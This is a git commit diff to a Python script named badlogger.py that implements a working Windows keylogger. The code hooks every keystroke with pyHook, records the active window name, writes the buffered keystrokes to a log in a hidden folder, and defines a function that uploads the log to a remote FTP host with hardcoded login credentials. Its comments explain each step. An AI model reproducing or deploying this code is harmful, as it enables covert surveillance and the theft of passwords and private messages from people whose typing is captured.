b62a7b87a03fbd15fe47366d6eb9cf5b8d6382a1
oranath <deanhoma@gmail.com>
2017-10-09 09:43:28 +0100

    Formatting Update

--- badlogger/badlogger.py
+++ badlogger/badlogger.py
@@ -1,50 +1,63 @@
-import pyHook, pythoncom, sys, logging
-import os
-import time
-from ftplib import FTP
+import pyHook, pythoncom, os
+from ftplib import FTP  # for uploading the file to an FTP server
+from datetime import datetime
 
-newpath = r'C:\hidden'
+newpath = r'C:\Hidden'
 if not os.path.exists(newpath):
     os.makedirs(newpath)
 
-t = time.time()
+todays_date = datetime.now().strftime('%Y-%b-%d')
+file_name = 'C:\\Hidden\Logger' + todays_date + '.txt'
 
-t_end = time.time() + 10
-
-file_log = 'C:\\hidden\hidden.txt'
-
-
-def CheckTime(endtime):
-    global t
-
-    if time.time() - t > 10:
-
-        data = open('C:\\hidden\\hidden.txt').read()
-        currenttime = str(time.time())
-        newdoc = open('C:\\hidden\\formatted' + currenttime + ".txt", "w")
-        newdoc.write(data.replace('\n', "").replace('\r', ""))
-        newdoc.close()
+currentline = ""  # This is used to store a buffer of keypresses
+windowname = ""  # Used to store the name of the window being typed in
 
 
-        #Open connection to FTP server and upload file
-        ftpserver = FTP('ftp.dlptest.com')
-        ftpserver.login('dlpuser@dlptest.com', 'fwRhzAnR1vgig8s')
-        ftpserver.storbinary("STOR Test123.txt", open('C:\\hidden\\formatted' + currenttime + ".txt", "r"))
+def uploadftp():
+    ftpserver = FTP('homa.ddns.net')
+    ftpserver.login('FTPUser', 'FTPpass1')
+    ftpserver.storbinary("STOR Logger" + todays_date + ".txt", open(file_name, 'r'))
+    ftpserver.close()
+    return
 
-        t = time.time()
-        return
 
-    else:
-
-        return
+def saveline(line):
+    newfile = open(file_name, 'a+')
+    newfile.write(line)
+    newfile.close()
 
 
 def OnKeyboardEvent(event):
-    CheckTime(t_end)
-    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
-    chr(event.Ascii)
-    logging.log(10, chr(event.Ascii))
-    return True
+    global currentline, windowname
+
+    if windowname != event.WindowName:  # Check if typing in a new window
+        if currentline != "":  # Check to make sure nothing is in the buffer waiting to be added to the log
+            currentline += '\n'  # Add a new line if characters are waiting in the buffer
+            saveline(currentline)  # Add files in the buffer from a previous window to the log
+
+        currentline = ""  # clear the line buffer now that any previous lines have been saved
+        saveline('\n-----WindowName: ' + event.WindowName + '-----\n')  # add the new window name to the file
+        windowname = event.WindowName  # set the current window name to be checked next time
+
+    if event.Ascii == 13 or event.Ascii == 9:  # Check if Enter or Tab is pressed
+        currentline += '\n'  # Add new line to the buffer if it is
+        saveline(currentline)  # Save the buffer to the log
+        currentline = ""  # clear the line buffer
+        return True  # exit
+
+    if event.Ascii == 8:  # Check if backspace is pressed
+        currentline = currentline[:-1]  # Delete the last typed character
+        return True  # exit
+
+    if event.Ascii < 32 or event.Ascii > 126:  # Check if a non ASCII character is pressed
+        if event.Ascii == 0:  # unknown character (arrow key, shift, ctrl, alt)
+            pass  # do nothing
+        else:
+            currentline = currentline + '\n' + str(event.Ascii) + '\n'
+    else:
+        currentline += chr(event.Ascii)  # add typed character to the buffer
+
+    return True  # pass event to other handlers
 
 
 hooks_manager = pyHook.HookManager()
@@ -52,6 +65,11 @@ hooks_manager.KeyDown = OnKeyboardEvent
 hooks_manager.HookKeyboard()
 pythoncom.PumpMessages()
 
-exit()
-
-#comment
+"""                     ---What's happening above?---
+    When a key is pressed, the logger first checks the window name that the key was pressed in, if this hasn't already
+    been recorded in the log it will be added.    
+    Next it will check if it was 'enter' or 'tab' that was pressed. If so, a new line will be added to the log.
+    Next it will check if backspace has been pressed. If so, the last character in the buffer will be deleted.
+    Next it will discard any non-ASCII characters
+    Finally the character will be added to the log if it meets none of the conditions above. 
+"""
